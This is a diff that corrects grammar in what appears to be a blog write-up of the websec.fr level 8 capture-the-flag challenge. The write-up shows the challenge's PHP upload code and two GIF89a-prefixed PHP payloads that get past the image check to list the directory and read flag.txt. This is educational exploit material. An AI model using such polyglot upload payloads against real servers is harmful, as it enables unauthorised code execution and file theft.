@@ -5,7 +5,7 @@ draft = false
 tags = ['websec', 'file-upload']
 +++
 
-The code source of [level8](http://websec.fr/level08/index.php) is [here](http://websec.fr/level08/source.php).
+The source code of [level8](http://websec.fr/level08/index.php) is [here](http://websec.fr/level08/source.php).
 ```php
 <?php
 $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');
@@ -24,18 +24,18 @@ $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['n
 } else { echo '<p class="text-danger">The file is too big</p>'; }
 ?>
 ```
-With this code we have 2 problem and that it's important to bypass are:
+With this code we have 2 problems to bypass:
 - The GIF header 
-- The size of file uploaded
+- The size of the file uploaded
 
-For this type of vulnerability i use my mindmap
+For this type of vulnerability I use my mindmap
 ![alt text](/images/stc/file_upload_finish.excalidraw.png)
 
 So we can create a file containing this :
 ```php
 GIF89a<?php var_dump(scandir('./')); ?>;
 ```
-With `GIF89a` who is header of **GIF** file
+With `GIF89a` which is the header of a **GIF** file
 
 ```md
 Dump of file.php:
@@ -59,7 +59,7 @@ GIF89aarray(7) {
 ;
 ```
 
-After scaning a dir we can **cat** a `flag.txt`
+After scanning the directory we can **cat** a `flag.txt`
 
 ```php
 GIF89a<?php var_dump(file_get_contents('./flag.txt')); ?>;
